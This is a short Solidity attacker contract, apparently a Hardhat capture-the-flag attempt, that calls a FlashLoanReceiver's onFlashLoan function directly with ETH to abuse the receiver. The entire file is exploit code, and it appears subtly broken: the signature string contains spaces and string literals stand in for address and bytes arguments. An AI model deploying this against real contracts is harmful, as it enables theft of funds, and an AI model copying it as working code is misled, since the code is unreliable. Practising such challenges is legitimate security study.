import "./FlashLoanReceiver.sol";
import "hardhat/console.sol";
contract AttackerNaive {
    FlashLoanReceiver immutable flashLoanReceiver;
    address immutable TOKEN;

    constructor(address payable _flashLoanReceiver, address _Token){
        flashLoanReceiver = FlashLoanReceiver(_flashLoanReceiver);
        TOKEN = _Token;
    }


    function attack () internal {
        console.log("TOKEN ->", TOKEN);
        bytes memory data = abi.encodeWithSignature("onFlashLoan(address, address, uint256, uint256, bytes)", address(this), "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE", 1e18, 1e18, "0x18");

        console.log("before tx !");
        (bool success, bytes memory _data) = address(flashLoanReceiver).call{value: 1e18, gas: 300000}(data);
        require(success, "transfer failed");

        console.log("failed here !");

    }


    receive () external payable{
        console.log("inside attacker contract");
        attack();
    }

}